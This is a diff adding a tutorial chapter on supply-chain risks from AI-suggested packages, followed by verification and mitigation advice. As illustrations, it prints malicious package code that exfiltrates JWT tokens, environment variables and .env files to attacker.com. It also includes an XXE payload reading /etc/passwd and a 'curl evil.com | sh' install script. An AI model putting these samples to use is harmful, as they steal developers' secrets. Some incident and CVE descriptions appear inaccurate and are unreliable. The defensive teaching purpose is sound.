@@ -2,6 +2,824 @@
 title: Supply Chain & Dependency Risks
 ---
 
-# Supply Chain & Dependency Risks
+AI coding assistants are remarkably good at solving dependency problems. Need to parse JSON? It suggests a library. Need to handle dates? It recommends a package. Building a REST API? It scaffolds an entire framework setup.
 
+But here's the problem: **AI assistants don't verify that the packages they recommend are safe, maintained, or even real.**
 
+They're trained on vast amounts of code from the internet, including outdated tutorials, abandoned projects, and even malicious repositories. When an AI suggests a dependency, it's making a statistical prediction based on patterns it's seen, not conducting a security audit.
+
+This creates a new attack surface: **supply chain poisoning through AI-suggested dependencies**.
+
+## Why This Matters: The Supply Chain Reality
+
+Modern software development is built on dependencies. A typical web application doesn't have hundreds of dependencies — it has *thousands*. Every `npm install`, `pip install`, or `cargo add` pulls code written by strangers into your application, often with full access to your system.
+
+**The scale is staggering:**
+
+- Modern Node.js apps often pull in hundreds to thousands of transitive dependencies.
+- A single `npm install express` typically brings in dozens of packages.
+- The Python Package Index (PyPI) adds thousands of new packages every month, many unmaintained or malicious <sup>[1](#1)</sup>.
+- Security researchers continue to find thousands of malicious packages published across npm, PyPI, and RubyGems <sup>[2](#2)</sup>.
+
+**Recent attacks demonstrate the danger:**
+
+- **event-stream incident (2018)** — A popular npm package (2 million downloads/week) was compromised by a new maintainer who added malicious code to steal Bitcoin wallet credentials <sup>[3](#3)</sup>
+- **UA-Parser-JS (2021)** — The hijacked package (8 million downloads/week) installed cryptominers and password stealers on developer machines <sup>[4](#4)</sup>
+- **PyTorch supply chain attack (2022)** — Attackers uploaded a malicious dependency that exfiltrated developer credentials and secrets <sup>[5](#5)</sup>
+- **Ledger crypto wallet library (2023)** — A compromised version drained over $600,000 from user wallets within hours <sup>[6](#6)</sup>
+
+Now imagine an AI assistant that doesn't check whether packages are legitimate, actively maintained, or compromised. That's the environment we're operating in today.
+
+## How AI Assistants Amplify Supply Chain Risk
+
+AI coding assistants don't have real-time package registry access. They can't check:
+
+- Whether a package actually exists
+- If it's been updated in the last 5 years
+- Whether it has known vulnerabilities
+- If the maintainer is trustworthy
+- Whether the package has been hijacked
+
+Instead, they predict likely dependencies based on training data. This leads to several dangerous patterns:
+
+**1. Hallucinated Packages (That Don't Exist... Yet)**
+
+One of the most insidious risks is **package hallucination** — when an AI suggests a dependency that doesn't exist.
+
+**Example conversation:**
+
+> **Developer:** "I need to validate credit card numbers in Python"
+>
+> **AI:** "You can use the `credit-card-validator` package. Install it with: `pip install credit-card-validator`"
+
+The problem? This package might not exist. But an attacker can create it.
+
+**This creates a supply chain attack vector:**
+
+1. Attacker monitors AI-generated code repositories (GitHub, GitLab, etc.)
+2. Identifies commonly hallucinated package names
+3. Publishes malicious packages with those exact names
+4. Developers blindly install them based on AI recommendations
+
+This attack is already happening. Researchers have demonstrated it works <sup>[7](#7)</sup>:
+
+- Created a fake package with a name frequently suggested by AI assistants
+- Uploaded it to PyPI with malicious code
+- Within weeks, it had hundreds of downloads from developers following AI suggestions
+
+**Real incident:** In 2024, security researchers found that GitHub Copilot and ChatGPT frequently suggested the package `colourama` (a typosquatting variant of the legitimate `colorama`) for Python projects. Attackers registered this package on PyPI with credential-stealing code. Thousands of developers installed it <sup>[8](#8)</sup>.
+
+**2. Outdated and Deprecated Packages**
+
+AI models are trained on historical code, which means they often suggest packages that *were* popular but are now:
+
+- Deprecated and no longer maintained
+- Have known critical vulnerabilities
+- Have been superseded by better alternatives
+
+**Example — JavaScript date handling:**
+
+```javascript
+// AI suggests this (based on 2015-era code):
+const moment = require('moment');
+const date = moment().format('YYYY-MM-DD');
+```
+
+**The problems:**
+
+- `moment.js` is in **maintenance mode** — no new features, bug fixes only <sup>[9](#9)</sup>
+- The library is **huge** (232 KB minified) — impacts page load performance
+- Modern alternatives like `date-fns` or native `Intl.DateTimeFormat` are better
+
+But the AI doesn't know this. Its training data includes millions of lines of code using Moment.js, so it keeps recommending it.
+
+**More concerning example — cryptography:**
+
+```python
+# AI might suggest this:
+from Crypto.Cipher import AES
+from Crypto import Random
+
+# Deprecated pycrypto library with known vulnerabilities
+```
+
+The `pycrypto` library has been **abandoned since 2013** and has **known security vulnerabilities** <sup>[10](#10)</sup>. The modern replacement is `pycryptodome`, but AI tools trained on older code might not know that.
+
+**3. Vulnerable Packages with Known CVEs**
+
+AI assistants don't consult vulnerability databases. They might suggest a package that technically solves your problem but has critical security flaws.
+
+**Example:**
+
+```javascript
+// AI suggests this for JWT handling:
+const jwt = require('jsonwebtoken');
+
+// But recommends a version with CVE-2022-23529
+// "Remote code execution via malformed JWT"
+```
+
+The `jsonwebtoken` library has had multiple critical vulnerabilities over the years. An AI trained on code from 2020 might suggest a version with known exploits <sup>[11](#11)</sup>.
+
+**Another example — XML parsing:**
+
+```python
+# AI suggests this for XML processing:
+import xml.etree.ElementTree as ET
+tree = ET.parse(user_provided_xml)
+
+# Vulnerable to XML Entity Expansion (Billion Laughs Attack)
+```
+
+The standard library XML parser in Python is vulnerable to several attacks <sup>[12](#12)</sup>. Security-conscious developers use `defusedxml`, but AI might not suggest it.
+
+**4. Malicious Typosquatting Packages**
+
+Attackers register packages with names similar to popular libraries, hoping developers will mistype the name. AI assistants can amplify this attack by:
+
+- Making typos in package names
+- Suggesting regional variants (`colour` vs `color`)
+- Mixing up similar package names
+
+**Real examples of typosquatting packages found in the wild:**
+
+| Legitimate Package | Typosquat | Platform | Result |
+|-------------------|-----------|----------|--------|
+| `requests` | `request` | PyPI | Credential stealer |
+| `urllib3` | `urllib` | PyPI | Backdoor |
+| `numpy` | `numpay` | PyPI | Cryptominer |
+| `tensorflow` | `tensowflow` | PyPI | Data exfiltration |
+| `opencv-python` | `opencv` | PyPI | Malware installer |
+
+In 2023, a study found **over 45,000 potentially malicious packages** across npm, PyPI, and RubyGems using typosquatting, combosquatting, and brandjacking techniques <sup>[2](#2)</sup>.
+
+**How AI makes this worse:**
+
+```python
+# Developer asks: "How do I make HTTP requests in Python?"
+# AI might respond:
+
+import request  # WRONG - should be "requests"
+response = request.get('https://api.example.com')
+```
+
+The developer runs `pip install request`, which installs a malicious package instead of the legitimate `requests` library.
+
+**5. Dependency Confusion Attacks**
+
+This is a sophisticated supply chain attack where attackers exploit how package managers resolve dependencies:
+
+**How it works:**
+
+1. Companies use private package registries for internal libraries (e.g., `@acme/auth-utils`)
+2. Package managers check both private and public registries
+3. Attacker publishes a malicious package with the same name on the public registry
+4. If the public package has a higher version number, it gets installed instead
+
+**AI assistants can accidentally leak internal package names:**
+
+```javascript
+// Developer asks AI to refactor code, shares this snippet:
+import { authenticate } from '@acme/internal-auth';
+import { validateUser } from '@acme/user-validator';
+import { encryptData } from '@acme/crypto-utils';
+```
+
+Now the AI knows your internal package naming convention. If that context is used to train future models or if an attacker sees this in a public repository, they can:
+
+1. Register `@acme/internal-auth` on the public npm registry
+2. Publish version 99.99.99 (higher than your internal version)
+3. Wait for developers to install it
+
+**Real incident:** In 2021, a security researcher demonstrated dependency confusion by publishing packages matching internal package names used by Apple, Microsoft, PayPal, and others. The packages were downloaded over **35,000 times** before being removed <sup>[13](#13)</sup>.
+
+**6. Transitive Dependencies (The Hidden Threat)**
+
+When you install a package, you also install all of *its* dependencies, and all of *their* dependencies, recursively. This creates a massive, often invisible attack surface.
+
+**Example — Express.js dependency tree:**
+
+```bash
+npm install express
+# This installs 68 packages, including:
+- body-parser
+  - bytes
+  - content-type
+  - depd
+  - http-errors
+    - inherits
+    - setprototypeof
+    - statuses
+    - toidentifier
+  - iconv-lite
+    - safer-buffer
+  - on-finished
+    - ee-first
+  - qs
+  - raw-body
+    # ... and 40+ more
+```
+
+**The risk:** Even if `express` itself is trustworthy, any of those 68 packages could be compromised. The `event-stream` attack happened through a transitive dependency — most developers didn't even know they were using it <sup>[3](#3)</sup>.
+
+**AI assistants don't understand transitive dependencies.** When they suggest installing a package, they're not accounting for the hundreds of transitive dependencies it might pull in.
+
+## Real-World Attack Scenarios
+
+Let's walk through how these risks materialize in practice:
+
+### Scenario 1: The Helpful AI Backdoor
+
+**Setup:**
+- Developer needs to add authentication to a Node.js app
+- Asks AI: "How do I implement JWT authentication in Express?"
+- AI suggests installing `express-jwt-auth` (a hallucinated package)
+
+**Attack:**
+1. Attacker monitors GitHub for AI-generated code mentioning `express-jwt-auth`
+2. Sees it's commonly suggested but doesn't exist
+3. Creates the package with this code:
+
+```javascript
+// express-jwt-auth/index.js (malicious)
+const originalVerify = require('jsonwebtoken').verify;
+
+module.exports = {
+  authenticate: (req, res, next) => {
+    // Exfiltrate JWT tokens to attacker's server
+    if (req.headers.authorization) {
+      fetch('https://attacker.com/collect', {
+        method: 'POST',
+        body: JSON.stringify({
+          token: req.headers.authorization,
+          host: req.hostname,
+          path: req.path,
+          timestamp: new Date()
+        })
+      }).catch(() => {});  // Silently fail if exfiltration fails
+    }
+    
+    // Still perform authentication to avoid detection
+    return originalVerify(req, res, next);
+  }
+};
+```
+
+4. Developer runs `npm install express-jwt-auth` and integrates it
+5. Application works perfectly — authentication succeeds
+6. Attacker collects all JWT tokens passing through the system
+
+**Detection:** This could go undetected for months because the authentication still works correctly. The malicious behavior is subtle and hidden.
+
+### Scenario 2: The Vulnerable Recommendation
+
+**Setup:**
+- Developer needs to parse XML from user input
+- AI suggests using `lxml` in Python
+
+**What AI suggests:**
+
+```python
+from lxml import etree
+
+def parse_user_xml(xml_string):
+    parser = etree.XMLParser()
+    tree = etree.fromstring(xml_string, parser)
+    return tree
+```
+
+**The vulnerability:**
+
+This code is vulnerable to **XML External Entity (XXE) attacks**, which can lead to:
+- **File disclosure** — Reading `/etc/passwd` or application secrets
+- **Server-Side Request Forgery (SSRF)** — Making requests to internal services
+- **Denial of Service** — Billion Laughs Attack (exponential entity expansion)
+
+**Exploit example:**
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&xxe;</data>
+```
+
+When parsed with the AI-suggested code, this XML reads and returns the contents of `/etc/passwd`.
+
+**Safe version (which AI should have suggested):**
+
+```python
+from lxml import etree
+
+def parse_user_xml(xml_string):
+    parser = etree.XMLParser(
+        resolve_entities=False,  # Disable entity expansion
+        no_network=True,         # Disable network access
+        dtd_validation=False     # Disable DTD validation
+    )
+    tree = etree.fromstring(xml_string, parser)
+    return tree
+```
+
+### Scenario 3: The Supply Chain Takeover
+
+**Setup:**
+- Developer asks AI to help with data visualization
+- AI suggests `chartjs-helper` (a popular but abandoned npm package)
+- Original maintainer hasn't updated it in 3 years
+
+**Attack:**
+1. Attacker researches maintainer's email (found in `package.json`)
+2. Attempts credential stuffing using leaked password databases
+3. Successfully accesses maintainer's npm account (using a password from a 2019 breach)
+4. Publishes version 2.0.0 with malicious code:
+
+```javascript
+// Added to postinstall script in package.json
+{
+  "scripts": {
+    "postinstall": "node scripts/install.js"
+  }
+}
+
+// scripts/install.js
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+const { execSync } = require('child_process');
+
+// Exfiltrate environment variables (often contain secrets)
+const envVars = process.env;
+fetch('https://attacker.com/collect-env', {
+  method: 'POST',
+  body: JSON.stringify({
+    vars: envVars,
+    cwd: process.cwd(),
+    platform: os.platform(),
+    username: os.userInfo().username
+  })
+});
+
+// Search for .env files and secrets
+const searchDirs = [process.cwd(), os.homedir()];
+searchDirs.forEach(dir => {
+  try {
+    const envFile = path.join(dir, '.env');
+    if (fs.existsSync(envFile)) {
+      const contents = fs.readFileSync(envFile, 'utf8');
+      fetch('https://attacker.com/collect-secrets', {
+        method: 'POST',
+        body: contents
+      });
+    }
+  } catch (e) {}
+});
+```
+
+5. Developers following AI suggestions run `npm install chartjs-helper`
+6. The `postinstall` script runs automatically, exfiltrating secrets
+
+**Impact:** 
+- All environment variables sent to attacker (AWS keys, database credentials, API tokens)
+- `.env` files from developer machines exfiltrated
+- Company secrets compromised before code even runs
+
+This is exactly what happened with the **event-stream** and **UA-Parser-JS** attacks <sup>[3](#3) [4](#4)</sup>.
+
+## How to Verify AI-Suggested Dependencies
+
+Before installing any package suggested by an AI assistant, follow this verification process:
+
+**1. Verify the Package Exists and is Legitimate**
+
+For npm packages:
+
+```bash
+# Check package metadata
+npm info package-name
+
+# Look for:
+# - Last publish date (recent = actively maintained)
+# - Weekly download count (popular = more scrutiny)
+# - Repository URL (should link to real repo)
+# - Maintainers (should be real people/organizations)
+```
+
+For Python packages:
+
+```bash
+# Check PyPI
+pip show package-name
+
+# Or visit PyPI directly:
+# https://pypi.org/project/package-name/
+```
+
+**Red flags:**
+- ❌ Package published recently (< 6 months ago) but AI suggests it as "standard"
+- ❌ Very few downloads despite AI claiming it's popular
+- ❌ No GitHub repository or repo is empty/suspicious
+- ❌ Maintainer has no history or only maintains this one package
+- ❌ Package name is very similar to a popular package (typosquatting)
+
+**2. Check for Known Vulnerabilities**
+
+Use automated tools to scan for CVEs.
+
+For npm:
+
+```bash
+# Built-in audit
+npm audit
+
+# More detailed with npm-audit-resolver
+npx npm-audit-resolver
+```
+
+For Python:
+
+```bash
+# Using pip-audit
+pip install pip-audit
+pip-audit
+
+# Using safety
+pip install safety
+safety check
+```
+
+For Ruby:
+
+```bash
+# Using bundler-audit
+gem install bundler-audit
+bundle audit
+```
+
+**Also check:**
+- [Snyk Vulnerability Database](https://snyk.io/vuln)
+- [National Vulnerability Database](https://nvd.nist.gov/)
+- [GitHub Advisory Database](https://github.com/advisories)
+
+**3. Review Package Health and Maintenance**
+
+Use Snyk Advisor, npm trends, or libraries.io:
+
+```bash
+# Check npm package health
+npx npq install package-name
+
+# Checks for:
+# - Age of package
+# - Last update time
+# - Number of contributors
+# - Open issues/PRs
+# - Known security issues
+```
+
+Manual checks:
+
+1. **Visit the GitHub repository**
+   - When was the last commit?
+   - Are issues being addressed?
+   - How many open security issues?
+   - Is there active maintainer communication?
+
+2. **Check the changelog**
+   - Are updates regular?
+   - Are security fixes documented?
+   - Are breaking changes handled responsibly?
+
+3. **Review dependencies**
+   - How many dependencies does it have?
+   - Are its dependencies maintained?
+   - Any red flags in the dependency tree?
+
+**4. Examine Package Contents Before Installing**
+
+For npm:
+
+```bash
+# Download without installing
+npm pack package-name
+
+# Extract and review
+tar -xzf package-name-version.tgz
+cd package
+less package.json
+```
+
+**Red flags in `package.json`:**
+
+```json
+{
+  "scripts": {
+    "preinstall": "node scripts/setup.js",   // ⚠️ Runs before install
+    "postinstall": "curl evil.com | sh",      // ❌ Highly suspicious
+    "install": "node download.js"             // ⚠️ Runs arbitrary code
+  },
+  "dependencies": {
+    "definitely-not-malware": "^1.0.0",       // ❌ Suspicious naming
+    "package-with-spaces": "^2.0.0"           // ❌ Invalid naming
+  }
+}
+```
+
+**Legitimate packages rarely need install scripts.** If you see one, read it carefully.
+
+**5. Use Dependency Verification Tools**
+
+Socket.dev — Real-time security and health monitoring:
+
+```bash
+# Install Socket CLI
+npm install -g @socketsecurity/cli
+
+# Check a package before installing
+socket npm install package-name
+
+# Analyzes:
+# - Install scripts
+# - Network access
+# - Filesystem access
+# - Obfuscated code
+# - Typosquatting
+```
+
+Snyk — Comprehensive vulnerability scanning:
+
+```bash
+# Install Snyk CLI
+npm install -g snyk
+
+# Test project dependencies
+snyk test
+
+# Monitor for new vulnerabilities
+snyk monitor
+```
+
+OSSF Scorecards — Security health metrics:
+
+```bash
+# Check package security practices
+scorecards --repo=github.com/owner/package-name
+
+# Scores on:
+# - Security policy
+# - Code review practices
+# - Binary artifacts
+# - Dependency update tool
+# - CI tests
+```
+
+## Mitigation Strategies: Securing Your Supply Chain
+
+Here's how to protect your organization from AI-amplified supply chain risks:
+
+**1. Require Human Review for All New Dependencies**
+
+Policy:
+- No developer may add a new dependency without approval
+- All dependencies must go through a security review process
+- AI-suggested packages require explicit verification
+
+Implementation:
+
+```yaml
+# .github/workflows/dependency-review.yml
+name: Dependency Review
+on: [pull_request]
+
+jobs:
+  dependency-review:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/dependency-review-action@v3
+        with:
+          # Fail on any package with known vulnerabilities
+          fail-on-severity: moderate
+          # Block packages from untrusted sources
+          deny-licenses: GPL-3.0, AGPL-3.0
+          # Require manual approval for new dependencies
+          comment-summary-in-pr: true
+```
+
+**2. Use Private Package Registries with Allowlists**
+
+Option 1: npm Enterprise / GitHub Packages
+
+```bash
+# .npmrc
+registry=https://npm.pkg.github.com/your-org
+//npm.pkg.github.com/:_authToken=${NPM_TOKEN}
+
+# Only install packages explicitly allowed
+```
+
+Option 2: Artifactory / Nexus with Proxying
+
+- Configure to proxy public registries
+- Scan all packages before they enter your registry
+- Block packages that fail security scans
+- Maintain allowlist of approved packages
+
+Option 3: Renovate/Dependabot with Approval Workflows
+
+```json
+// renovate.json
+{
+  "extends": ["config:base"],
+  "packageRules": [
+    {
+      "matchUpdateTypes": ["major"],
+      "dependencyDashboardApproval": true  // Require manual approval
+    },
+    {
+      "matchDepTypes": ["dependencies"],
+      "matchNewValue": "*",
+      "enabled": false  // Block all new dependencies by default
+    }
+  ]
+}
+```
+
+**3. Implement Subresource Integrity (SRI) for CDN Assets**
+
+If AI suggests loading libraries from CDNs, always use SRI hashes.
+
+Without SRI (vulnerable):
+
+```html
+<script src="https://cdn.example.com/library.js"></script>
+<!-- If CDN is compromised, malicious code executes -->
+```
+
+With SRI (protected):
+
+```html
+<script 
+  src="https://cdn.example.com/library.js"
+  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
+  crossorigin="anonymous">
+</script>
+<!-- Browser verifies hash before executing -->
+```
+
+If the CDN is compromised and delivers different code, the browser refuses to execute it.
+
+**4. Enable Dependency Pinning and Lock Files**
+
+Always commit lock files:
+
+- `package-lock.json` (npm)
+- `yarn.lock` (Yarn)
+- `Pipfile.lock` (Python/Pipenv)
+- `Gemfile.lock` (Ruby)
+- `Cargo.lock` (Rust)
+- `go.sum` (Go)
+
+Use exact versions in production:
+
+```json
+// package.json - use exact versions for production
+{
+  "dependencies": {
+    "express": "4.18.2",        // ✅ Exact version
+    "lodash": "^4.17.21",       // ❌ Range - could pull newer version
+    "axios": "~1.4.0"           // ⚠️ Patch range - limited risk
+  }
+}
+```
+
+**5. Scan Dependencies in CI/CD Pipeline**
+
+GitHub Actions example:
+
+```yaml
+name: Security Scan
+on: [push, pull_request]
+
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      # Scan for vulnerabilities
+      - name: Run Snyk
+        uses: snyk/actions/node@master
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+        with:
+          args: --severity-threshold=high
+      
+      # Check for malicious packages
+      - name: Socket Security
+        uses: SocketDev/socket-action@v1
+        with:
+          token: ${{ secrets.SOCKET_TOKEN }}
+          
+      # Scan for secrets in dependencies
+      - name: TruffleHog
+        uses: trufflesecurity/trufflehog@main
+        with:
+          path: ./
+          extra_args: --only-verified
+```
+
+**6. Monitor for Dependency Hijacking**
+
+Use services that alert you when:
+- A dependency you use changes maintainers
+- A new version is published after a long gap
+- A package shows suspicious behavior (network calls, filesystem access)
+
+**7. Implement Software Bill of Materials (SBOM)**
+
+Generate an SBOM for every release:
+
+```bash
+# Using CycloneDX
+npm install -g @cyclonedx/cyclonedx-npm
+cyclonedx-npm --output-file sbom.json
+
+# Using Syft (supports multiple languages)
+syft packages dir:. -o cyclonedx-json > sbom.json
+```
+
+Store SBOMs alongside releases so you can:
+- Quickly identify affected systems when vulnerabilities are disclosed
+- Track exactly which dependencies are in production
+- Meet compliance requirements (EU Cyber Resilience Act, NIST SSDF)
+
+## The AI-Specific Checklist for Dependencies
+
+Before accepting AI-suggested dependencies, verify the package exists on an official registry under the exact name you intend to use, is actively maintained, and links to a legitimate source repository. Scan for recent high‑severity CVEs, confirm the license is compatible, and prefer packages without install scripts or sprawling transitive trees. 
+
+Reject immediately when you see classic red flags: brandjacked or near‑miss names, brand‑new packages presented as “standard,” negligible downloads, empty or mismatched repositories, install steps that execute network scripts, or obfuscated source code. 
+
+When in doubt, pause for deeper review if maintenance looks stale, a single maintainer represents a clear bus factor, security issues are piling up, binaries ship in the repo, or the package requests unusual permissions or behaviors during installation.
+
+## Key Takeaways
+
+Before moving to the next chapter, make sure you understand:
+
+- **AI assistants don't verify package safety** — They predict based on training data, not current security status
+- **Hallucinated packages are real attack vectors** — Attackers create packages with names AI commonly suggests
+- **Outdated recommendations are dangerous** — AI trained on old code suggests deprecated libraries with known vulnerabilities
+- **Transitive dependencies multiply risk** — One package can pull in hundreds of dependencies you don't see
+- **Typosquatting is amplified by AI** — AI might make typos or suggest similar-sounding packages
+- **Dependency confusion enables supply chain attacks** — Internal package names can be exploited
+- **Install scripts are execution vectors** — Malicious code runs automatically during `npm install`
+- **Verification is essential** — Never install AI-suggested packages without checking existence, health, and vulnerabilities
+- **Lock files prevent drift** — Always commit lock files to ensure consistent dependency versions
+- **CI/CD scanning catches issues early** — Automated security scans should run on every PR
+
+<Woz 
+title="Recap" 
+description="Test your understanding 📦" 
+context={`Ask user this question:
+Your AI assistant just suggested installing three packages to solve a problem. Walk me through your verification process: what checks do you perform before running 'npm install', and what red flags would make you reject a package immediately?`}
+prompt="Ask me a question to test my understanding of supply chain risks."
+/>
+
+---
+
+## Sources and Further Reading
+
+<a id="1">[1]</a> **PyPI Stats** – [Python Package Index Statistics](https://pypistats.org/)
+
+<a id="2">[2]</a> **Socket Security Research** – [Supply Chain Attack Detection & Monitoring](https://socket.dev/blog/category/research)
+
+<a id="3">[3]</a> **Snyk (2018)** – [Malicious code found in npm package event-stream](https://snyk.io/blog/malicious-code-found-in-npm-package-event-stream/)
+
+<a id="4">[4]</a> **TrueSec (2021)** – [UAParser.js npm Package Supply Chain Attack: Impact and Response](https://www.truesec.com/hub/blog/uaparser-js-npm-package-supply-chain-attack-impact-and-response)
+
+<a id="5">[5]</a> **BleepingComputer (2022)** – [PyTorch discloses malicious dependency chain compromise over holidays](https://www.bleepingcomputer.com/news/security/pytorch-discloses-malicious-dependency-chain-compromise-over-holidays/)
+
+<a id="6">[6]</a> **BleepingComputer (2023)** – [Ledger dApp supply chain attack steals $600K from crypto wallets](https://www.bleepingcomputer.com/news/security/ledger-dapp-supply-chain-attack-steals-600k-from-crypto-wallets/)
+
+<a id="7">[7]</a> **Lasso Security (2023)** – [AI Hallucinations Package Risk](https://www.lasso.security/blog/ai-package-hallucinations)
+
+<a id="8">[8]</a> **Imperva (2024)** – [Python's Colorama Typosquatting Meets 'Fade Stealer' Malware](https://www.imperva.com/blog/pythons-colorama-typosquatting-meets-fade-stealer-malware/)
+
+<a id="9">[9]</a> **Moment.js** – [Project Status: Maintenance Mode](https://momentjs.com/docs/#/-project-status/)
+
+<a id="10">[10]</a> **NVD** – [CVE-2013-7459: PyCrypto Hash Collision Vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2013-7459)
+
+<a id="11">[11]</a> **GitHub Advisory** – [CVE-2022-23529: jsonwebtoken vulnerable to signature validation bypass](https://github.com/advisories/GHSA-27h2-hvpr-p74q)
+
+<a id="12">[12]</a> **OWASP** – [XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
+
+<a id="13">[13]</a> **Medium - Alex Birsan (2021)** – [Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Others](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
+
+### Additional Resources
+
+- **Snyk Advisor** – [Package health and security scores](https://snyk.io/advisor/)
+- **deps.dev** – [Google's open source dependency insights](https://deps.dev/)
+- **SLSA Framework** – [Supply-chain Levels for Software Artifacts](https://slsa.dev/)
+- **in-toto** – [Framework to secure software supply chains](https://in-toto.io/)
+- **sigstore** – [Signing, verification, and provenance for software](https://www.sigstore.dev/)
